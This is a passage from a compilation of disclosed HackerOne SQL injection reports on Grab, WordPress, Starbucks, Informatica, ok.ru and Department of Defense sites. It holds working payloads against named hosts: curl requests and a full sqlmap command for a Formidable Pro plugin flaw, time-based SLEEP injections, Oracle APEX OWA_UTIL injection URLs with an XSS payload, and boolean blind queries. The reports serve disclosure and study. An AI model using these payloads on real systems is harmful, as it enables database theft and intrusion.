From here it was pretty straightforward.  

Thank you Zomato team for the highest bounty stated in the policy.

---

### [www.drivegrab.com SQL injection](https://hackerone.com/reports/273946)

- **Report ID:** `273946`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** Grab
- **Reporter:** @jouko
- **Bounty:** 4500 usd
- **Disclosed:** 2017-11-17T06:28:15.090Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
The website uses a WordPress plugin called Formidable Pro. I found an SQL injection in the plugin code.

**Description:**
The plugin allows the site admin to create forms to be filled by users. For this end it implements some AJAX functions, including one to preview (or actually just view) a form. The functionality is probably intended for administrators to be used in the form design phase, but for some reason it is accessible to unauthenticated users.

The preview function accepts some parameters. Some of them allows the user to specify HTML and WordPress shortcodes (special WordPress markup) to be included with the preview. One of the shortcodes implemented by the Formidable Pro plugin contains an SQL injection vulnerability.

## Browsers Verified In:
N/A

## Steps To Reproduce:
Verifying the AJAX preview function with the cURL tool:
~~~~
curl -s -i 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview'
~~~~
This request shows a preset "contact us" form (if form id is not defined, you'll get the first form in the database).

The preview AJAX request accepts some parameters. For example you can define HTML to be shown after the form:
~~~~
curl -s -i 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview&after_html=hello world'
~~~~
You see that "hello world" appears on the page after the "Contact us" form.

The HTML may contain WordPress shortcodes which are special markup in square brackets. There are shortcodes implemented by the WordPress core, and shortcodes implemented by plugins. Any of these can be included in the form preview.

The Formidable plugin implements several shortcodes. One of them is [display-frm-data] which displays data that people have entered in a form. It accepts a few parameters, e.g. the form id:

~~~~
curl -s -i 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview&after_html=XXX[display-frm-data id=835]YYY'
~~~~

In the resulting HTML you see some form entries between "XXX" and "YYY".

The [display-frm-data] shortcode also accepts parameters "order_by" and "order" for sorting the entries. The "order_by" parameter can contain a field ID or list of them. The "order" parameter is supposed to contain "ASC" or "DESC" to indicate the sorting direction. These parameters can be used to carry out an SQL injection.

Example:
~~~~
curl -s -i 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview&after_html=XXX[display-frm-data id=835 order_by=id limit=1 order=zzz]YYY'
~~~~

Although this example gives no meaningful output, you should see in the server logs that the "zzz" went in an SQL query which produced an error message.

The shortcode parameters are processed in various ways which makes it very complicated to perform a successful SQL query and retrieve data. However it is possible.

The injected code goes in the ORDER BY clause of an intermediate query that retrieves the list of form entry ID's. Results of the manipulated query aren't directly visible. The attacker can control the order of entries appearing on the page, which is enough to communicate one bit of data from the database.

A further complication is that any comma symbols in the injected data are specially treated and affect the resulting SQL query in a way that creates errors. With careful formatting, however, the query can be salvaged.

I came up with the following sqlmap options to retrieve any data from the database:
~~~~
./sqlmap.py -u 'https://www.drivegrab.com/wp-admin/admin-ajax.php' --data 'action=frm_forms_preview&before_html=XXX[display-frm-data id=835 order_by=id limit=1 order="%2a( true=true )"]XXX' --param-del ' ' -p true --dbms mysql --technique B --string persondetailstable --eval 'true=true.replace(",",",-it.id%2b");order_by="id,"*true.count(",")+"id"'  --test-filter DUAL --tamper commalesslimit -D █████ --sql-query "SELECT ██████████ FROM █████ WHERE id=2"
~~~~
This works with the latest sqlmap. The "commalesslimit" tamper module helps avoiding comma symbols in any LIMIT clauses. The --eval parameter does some processing to repair queries that contain commas in the SELECT clause.

Specifically, for each comma appearing in the order parameter, the plugin appends ",it.id" in the query. The repair code appends "-it.id+" after each comma to neutralize the effect. In other words, an injected "SELECT a,b" query would be translated to "SELECT a,it.id b" by the shortcode logic. The repair code changes it to "SELECT a, it.id-it.id+b" which evaluates to the original injected query.

Result of the above sqlmap command:
~~~~
[03:09:30] [INFO] testing █████
[03:09:30] [INFO] confirming ██████
[03:09:30] [INFO] the back-end DBMS is ███
web application technology: █████
back-end DBMS: ███████
[03:09:30] [INFO] fetching SQL SELECT statement query output: 'SELECT ███████ FROM ████ WHERE id=2'
[03:09:30] [INFO] retrieved: 1
[03:09:43] [INFO] retrieving the length of query output
[03:09:43] [INFO] ███
[03:10:46] [INFO] retrieved: █████             
SELECT ██████ FROM ████ WHERE id=2 [1]:
[*] ██████████
~~~~

## Supporting Material/References:

As a proof of concept I retrieved some data.

Tables in the database:
~~~~
[██████████]
+---------------------------------+
| █████████      |
| █████████          |
| █████████        |
| ███████     |
| ██████████ |
| ███████         |
| ██████████      |
| ████ |
| ██████████                |
| ███                   |
| ████████ |
| █████████                 |
| █████                  |
| ███             |
| █████████                  |
| ███████ |
| ███████         |
| ██████████       |
| ████             |
| █████                  |
| ██████████ |
| ███                      |
| █████                    |
| ██████████                   |
| ██████████                      |
| ████████ |
| █████████              |
| ████                   |
| ██████                      |
| ████████                   |
| ██████                      |
+---------------------------------+
~~~~

Administrator users and their password hashes:

~~~~
█████
█████
██████
████████
███
█████
████████
~~~~

Webroot path:
~~~~
███
~~~~

**Summary (team):**

The researcher reported that it was possible to exploit previously unknown SQL injection in a WordPress plugin called Formidable Pro which was fixed immediately. He was able to gain read access on wordpress database and provided us all the relevant details (PoC) required for us to reproduce the issue.

_**As also stated on our Policy page:**_

```
Our rewards are impact-based. This means, for example, that we will issue a relatively high reward
for a vulnerability that has the potential to leak complete dataset of confidential data, but that we
will issue  lower reward for a vulnerability that allows an attacker to access to an isolated and limited
dataset. When we have our reward meetings, we always ask one question: If a malicious attacker
abuses this, how bad off are we? We assume the worst and pay out the bug accordingly.

If a single fix fixes multiple vulnerabilities, we treat this as a single vulnerability. 
For example, if you find 3 vulnerabilities in a WordPress plugin we use, and our fix is to remove 
the plugin, this will receive a single bounty, determined, as always, by impact.
```

Therefore, in order to be able to accurately identify the overall impact on business, we further investigated to find out the extent of data leakage. During our investigation, we found that database was storing a dataset (representing ~0.6%) containing our driver partners PII.

Researcher also reported 2 other different security issues on same plugin, Formidable Pro. All the 3 vulnerabilities reported were on the latest plugin, and having no updates available at the time by the plugin developers. Deleting the plugin was a single fix.

After assigning the severity based on the data exposure the researcher pointed out that, there is a way to pivot from the DB to wordpress admin dashboard exploiting iThemes-Sync authentication key which was exposed in a database. After our investigation we believe that pivoting was not possible in the context because of the server hardening. We fairly asked him to show specific evidence of his new finding in order to reassess the bounty. Because the SQL injection was already fixed the researcher was not able to perform any remote code execution but he did provided PoC for helping us to reproduce the RCE. From his understanding the only values required for performing RCE was user id and authentication key (which was stored in plaintext in a DB).

While investigating this RCE using researcher's provided PoC we figured out that those two values are not enough for reproducing the RCE because of the following error message:

```
The hash could not be validated as a correct hash.
```

On checking with ithemes developers  on email, they responded with the following:

```
We're using randomly generated salts for each site to build the hashes, but we can't go into specifics, for obvious security reasons.
```

Since neither we or the researcher were able to confirm the RCE we couldn't reassess the bounty.

Based on above data points collected through our investigation, we decided to award the researcher 4500 USD. Also, to appreciate the researcher for spending valuable time and efforts in submitting other 2 detailed bug reports to us, on the same plugin. Since these 2 bug reports were considered duplicate because of single fix, yet we decided to award 250 USD on each duplicate bug report as well.

Needless to say, we take ALL reported vulnerabilities, very seriously and investigate them to best of our technical abilities. We have awarded 10,000 USD bounty to researchers, who have submitted vulnerabilities with critical impact, in the past and we will continue to do so in the future as well. 

At the end of the day, all these efforts made by H1 triage team, H1 researchers and Grab security team, comes down to overall risk and impact to the business. However, we always aim to be fair. Some researchers won't agree with some of our decisions, but we're paying out to the best of our ethical ability and trust that the majority of researchers will consider their rewards fair and in many cases generous.

We would like to once again thank the researcher for his great report and allowing us to fix this issue. We really appreciate his help in keeping Grab and our customers safe and secure.

---

### [WordPress DB Class, bad implementation of prepare method guides to sqli and information disclosure](https://hackerone.com/reports/179920)

- **Report ID:** `179920`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** WordPress
- **Reporter:** @b258ea62bf297b02afa9854
- **Bounty:** - usd
- **Disclosed:** 2017-11-13T14:56:48.898Z
- **CVE(s):** -

**Vulnerability Information:**

Issue 1: Method checks if first argument is an array and if it is, it avoids the rest of the arguments and uses the first argument array values as input.

Issue 2: When input query has %s in it, then it quote and this guides to sql injection in case query that need to be prepared have quoted user controlled input in it.  

This leaves all wordpress plugins/ themes potentially vulnerable on this two types of attack. As PoC sqli in bbpress wp plugin and core wp function is shown.

PoC: 
1. There is SQLi in bbpress in case anonymous posting is allowed. ( check  bbpress-sqli.png)
2.  Demo for the Issue 1 and Issue 2 for the prepare method
3. Wordpress core function delete_metadata is vulnerable to sqli in case delete all e.g. last argument is true and meta value has value e.g. is user supplied / controlled.

---

### [SQL Injection, exploitable in boolean mode](https://hackerone.com/reports/246412)

- **Report ID:** `246412`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** Eternal
- **Reporter:** @securitygab
- **Bounty:** - usd
- **Disclosed:** 2017-07-19T08:47:01.693Z
- **CVE(s):** -

**Summary (team):**

##Issue
The reporter found a SQL injection in one of the applications in www.zomato.com.

##Fix
The issue was investigated and found to be valid and fixed.

---

### [SQL Injection vulnerability in a DoD website](https://hackerone.com/reports/216699)

- **Report ID:** `216699`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @albinowax
- **Bounty:** - usd
- **Disclosed:** 2017-07-05T16:05:38.194Z
- **CVE(s):** -

**Summary (team):**

A Department of Defense webserver was vulnerable to a SQL injection attack that could have revealed sensitive information. @albinowax was able to demonstrate this vulnerability by crafting  specially formatted URLs. Thank you!

---

### [SQL Injection vulnerability in a DoD website](https://hackerone.com/reports/192110)

- **Report ID:** `192110`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @korprit
- **Bounty:** - usd
- **Disclosed:** 2017-06-23T13:34:30.031Z
- **CVE(s):** -

**Summary (team):**

A Department of Defense webserver was vulnerable to a SQL injection attack that could have revealed sensitive information. @korprit was able to demonstrate this vulnerability by crafting specially formatted URLs. Thanks @korprit!

---

### [SQL Injection vulnerability in a DoD website](https://hackerone.com/reports/192079)

- **Report ID:** `192079`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @korprit
- **Bounty:** - usd
- **Disclosed:** 2017-06-23T13:32:25.438Z
- **CVE(s):** -

**Summary (team):**

A Department of Defense webserver was vulnerable to a SQL injection attack that could have revealed sensitive information. @korprit was able to demonstrate this vulnerability by crafting specially formatted URLs. Thanks @korprit!

---

### [SQL injection vulnerability on a DoD website](https://hackerone.com/reports/193936)

- **Report ID:** `193936`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @thirup
- **Bounty:** - usd
- **Disclosed:** 2017-05-31T21:44:17.621Z
- **CVE(s):** -

**Summary (team):**

A Department of Defense website was vulnerable to a SQL injection attack which may allow an attacker to execute arbitrary SQL commands and expose sensitive data. @mthirup was able to demonstrate this vulnerability by crafting a specially formatted URL.

---

### [Blind SQL Injection](https://hackerone.com/reports/221757)

- **Report ID:** `221757`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** ok.ru
- **Reporter:** @linkks
- **Bounty:** - usd
- **Disclosed:** 2017-04-20T16:51:53.570Z
- **CVE(s):** -

**Summary (team):**

@linkks reported a blind sql injection:

> POST /api/updateShareCount HTTP/1.1
> Host: insideok.ru
> Cache-Control: no-cache
> Accept: application/json, text/javascript, /; q=0.01
> Origin: http://insideok.ru
> Referer: http://insideok.ru/lica
> User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0
> X-Requested-With: XMLHttpRequest
> Accept-Language: en-us,en;q=0.5
> Cookie: session=27e8i3jqiutlk7bd2nmgoftbg0
> Accept-Encoding: gzip, deflate
> Content-Length: 108
> Content-Type: application/x-www-form-urlencoded; charset=UTF-8

> type=sharesCountTw&url=http%3a%2f%2finsideok.ru%2flica&count=-1+or+1%3d((SELECT+1+FROM+(SELECT+SLEEP(25))A))

insideok.ru is corporate blog and out of the program scope. There was no risk for the main domain and users' data.

---

### [sqli](https://hackerone.com/reports/207695)

- **Report ID:** `207695`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** Ubiquiti Inc.
- **Reporter:** @linkks
- **Bounty:** - usd
- **Disclosed:** 2017-03-31T11:21:16.796Z
- **CVE(s):** -

**Summary (team):**

The researcher found a SQL Injection in one of ours legacy (now defunctioned) servers.

---

### [SQL injection in 3rd party software Anomali](https://hackerone.com/reports/206872)

- **Report ID:** `206872`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** Uber
- **Reporter:** @kazan71p
- **Bounty:** 2500 usd
- **Disclosed:** 2017-03-21T17:22:10.037Z
- **CVE(s):** -

**Summary (team):**

SQLi in Anomali from Threatstream on `ts02.uberinternal.com` -- the server was hosted outside of our infrastructure and any potential data exposure was limited to Uber employees, not Uber users.

It was a pleasure working with @kazan71p and we look forward to more reports in the future.

---

### [SQL injection vulnerability on a DoD website](https://hackerone.com/reports/200623)

- **Report ID:** `200623`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @vag_mour
- **Bounty:** - usd
- **Disclosed:** 2017-03-16T16:23:45.066Z
- **CVE(s):** -

**Summary (team):**

A Department of Defense website was vulnerable to a SQL injection attack which may allow an attacker to execute arbitrary SQL commands and expose sensitive data.  @vag_mour was able to demonstrate this vulnerability by crafting a specially formatted URL. Thanks to @vag_mour for discovering this vulnerability!

---

### [Time-based Blind SQLi on news.starbucks.com](https://hackerone.com/reports/198292)

- **Report ID:** `198292`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** Starbucks
- **Reporter:** @toctou
- **Bounty:** - usd
- **Disclosed:** 2017-02-24T19:47:12.100Z
- **CVE(s):** -

**Vulnerability Information:**

Hi,

I just found that the post parameter "group_id" for a particularly crafted http request is being vulnerable to injection due to missing parameter sanitization.

PoC:
```
POST / HTTP/1.1
Host: news.starbucks.com
Connection: close
Content-Length: 81
Cache-Control: max-age=0
Origin: https://news.starbucks.com
Content-Type: application/x-www-form-urlencoded

ACT=55&jsontree={"x":1}&site_id=1&group_id=1'-IF(1=1,SLEEP(1),0) AND group_id='1
```

This query will result in an execution of a SLEEP command, delaying the server response time:
```
time curl --data "ACT=55&jsontree={"x":1}&site_id=1&group_id=1'-IF(1=1,SLEEP(1),0) AND group_id='1" https://news.starbucks.com

real	0m4.945s
user	0m0.000s
sys		0m0.063s
```

If the custom IF statement evaluates to False, the response would be sensibly faster:
```
time curl --data "ACT=55&jsontree={"x":1}&site_id=1&group_id=1'-IF(1=2,SLEEP(1),0) AND group_id='1" https://news.starbucks.com

real	0m0.860s
user	0m0.000s
sys		0m0.031s
```

In this way it was possible to detect the dbms version being 5:
```
time curl --data "ACT=55&jsontree={"x":1}&site_id=1&group_id=1'-IF(MID(VERSION(),1,1)='5',SLEEP(1),0) AND group_id='1" https://news.starbucks.com

real	0m4.945s

time curl --data "ACT=55&jsontree={"x":1}&site_id=1&group_id=1'-IF(MID(VERSION(),1,1)='4',SLEEP(1),0) AND group_id='1" https://news.starbucks.com

real	0m1.005s
```

**Summary (researcher):**

Full story here: http://timeofcheck.com/time-based-blind-sqli-on-news-starbucks-com/

---

### [[afocusp.informatica.com] Sql injection  afocusp.informatica.com:37777](https://hackerone.com/reports/178632)

- **Report ID:** `178632`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** Informatica
- **Reporter:** @e3xpl0it
- **Bounty:** - usd
- **Disclosed:** 2017-01-21T19:05:37.398Z
- **CVE(s):** -

**Vulnerability Information:**

hi !There is another sql injection on host  afocusp.informatica.com:37777

POC 
version
http://afocusp.informatica.com:37777/pls/apex/f?);OWA_UTIL.CELLSPRINT(:1);--=select+*+from+v$version

hostname of the database server 
psvlxtdapp1.inf

http://afocusp.informatica.com:37777/pls/apex/f?);OWA_UTIL.CELLSPRINT(:1);--=select+SYS_CONTEXT('USERENV',+'HOST',+15)+ipaddr+from+dual

IP address of the database server (local)
10.1.192.93 

http://afocusp.informatica.com:37777/pls/apex/f?);OWA_UTIL.CELLSPRINT(:1);--=select+SYS_CONTEXT('USERENV',+'IP_ADDRESS',+15)+ipaddr+from+dual

Ps
You need to patch all servers with the url /pls/apex/f? this is  old bug in oracle.

---

### [[ipm.informatica.com] Sql injection Oracle ](https://hackerone.com/reports/178057)

- **Report ID:** `178057`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** Informatica
- **Reporter:** @e3xpl0it
- **Bounty:** - usd
- **Disclosed:** 2017-01-21T19:05:21.226Z
- **CVE(s):** -

**Vulnerability Information:**

Hi host ipm.informatica.com is vulnerable to sql injection attacks the web application does not produce sufficient validation on user input.

POC
detection
request 1
http://ipm.informatica.com/pls/apex/f?1'=1  response 500 HTTP/1.1 500 Internal Server Error
request 2
http://ipm.informatica.com/pls/apex/f?1''=1 response HTTP/1.1 404 Not Found


exploitation

http://ipm.informatica.com/pls/apex/f?);OWA_UTIL.CELLSPRINT(:1);--=SELECT+banner+FROM+v$version   
  
Oracle Database 11g Release 11.2.0.3.0 - 64bit Production PL/SQL Release 11.2.0.3.0 - Production CORE 11.2.0.3.0 
Production TNS for Linux: Version 11.2.0.3.0 - Production NLSRTL Version 11.2.0.3.0 - Production 

Cross Site Scripting via sql injection 

http://ipm.informatica.com/pls/apex/f?);HTP.PRINT(:1);--=positive<svg/onload=prompt('XSS\u0020via\u0020sql\u0020injection')>

and etc 
http://ipm.informatica.com/pls/apex/f?);OWA_UTIL.CELLSPRINT(:1);--=SELECT+USERNAME+FROM+ALL_USERS

---

### [[informatica.com] Blind SQL Injection](https://hackerone.com/reports/117073)

- **Report ID:** `117073`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** Informatica
- **Reporter:** @konqi
- **Bounty:** - usd
- **Disclosed:** 2016-04-19T09:12:33.169Z
- **CVE(s):** -

**Vulnerability Information:**

Hi guys!

JSON POST parameter "docId" is vulnerable to Blind SQL Injection attack

PoC (Raw query)

POST /_vti_bin/RatingsCalculator/RatingsCalculator.asmx/CalculateRatings HTTP/1.1
User-Agent: Opera/9.80 (Windows NT 6.1; WOW64) Presto/2.12.388 Version/12.17
Host: kb-test.informatica.com
Accept-Language: ru-RU,ru;q=0.9,en;q=0.8
Accept-Encoding: gzip, deflate
Referer: https://kb-test.informatica.com/KBExternal/pages/infasearch.aspx?k=pew
Cookie: ASP.NET_SessionId=03khmmjpaxvcos45opn2kg55; BIGipServerkb-test-pool=2670002442.22811.0000; WebAnalyticsSessionId2=b600796d-cd0e-4797-9610-872c18063793; kbemail=; mkt_cookie=anonymous; __cdrop=.D1P9XM.; _ga=GA1.2.1961398489.1453319834; _mkto_trk=id:189-ZHZ-794&token:_mch-informatica.com-1452163097365-89988; s_vnum=1458351793680%26vn%3D1; gpv_p14=welcome%20page%3Awelcome; s_ppv=-%2C76%2C76%2C947; s_cc=true; gpv2=kb%3Aproddocsearch; s_nr=1455762795883-Repeat; s_invisit=true; s_sq=informatica-mysupport-dev%3D%2526pid%253Dhttps%25253A%25252F%25252Fkb.informatica.com%25252F_layouts%25252FProductDocumentation%25252FPage%25252FProductDocumentSearch.aspx%2526oid%253Dhttps%25253A%25252F%25252Fkb.informatica.com%25252F_layouts%25252FProductDocumentation%25252FPage%25252FProductDocumentSearch.aspx%252523%2526ot%253DA; wooTracker=vALSmwIXvuQp; AMCV_C0B11CFE5330AAFD0A490D45%40AdobeOrg=793872103%7CMCIDTS%7C16850%7CMCMID%7C49728577452301121918884624029572688913%7CMCAAMLH-1456367601%7C6%7CMCAAMB-1456367601%7CNRX38WO0n5BH8Th-nqAG_A%7CMCAID%7CNONE; mbox=check#true#1455762863|session#1455762802845-749291#1455764663
Connection: Keep-Alive
Content-Length: 117
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Content-Type: application/json;charset=utf-8

{docId:"1 and (select substring(@@version,1,1))='M'", docTitle:'Getting an error while trying to import WSDL as...' }

for a TRUE query we get - {"d":"3"}
for a FALSE - {"d":""}
for a Syntax error - {"Message":"There was an error processing the request.","StackTrace":"","ExceptionType":""}

so using this blind technique we can extract the data from Database

examples

docId:"1 and (select substring(@@version,1,1))='M'" - true
docId:"1 and (select substring(@@version,2,1))='i'" - true
docId:"1 and (select substring(@@version,3,1))='c'" - true

docId:"1 and (select substring(@@version,22,1))='2'"
docId:"1 and (select substring(@@version,23,1))='0'"
docId:"1 and (select substring(@@version,24,1))='0'"
docId:"1 and (select substring(@@version,25,1))='8'"

and so on.. . So we have a MS SQL Server 2008

---
